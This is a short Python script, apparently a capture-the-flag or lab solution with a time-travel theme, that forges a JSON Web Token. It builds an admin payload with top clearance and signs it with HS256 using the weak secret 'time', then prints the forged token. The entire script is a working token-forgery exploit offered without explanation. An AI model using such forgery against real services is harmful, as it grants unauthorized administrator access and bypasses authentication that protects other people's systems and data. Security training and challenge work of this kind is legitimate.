import jwt
import time as t

payload = {
    "sub": "admin",
    "name": "Dr. Chronos",
    "role": "admin",
    "clearance": 5,
    "department": "Temporal Command",
    "iat": int(t.time()),
    "exp": int(t.time()) + 3600,
}

forged = jwt.encode(payload, "time", algorithm="HS256")
print(forged)
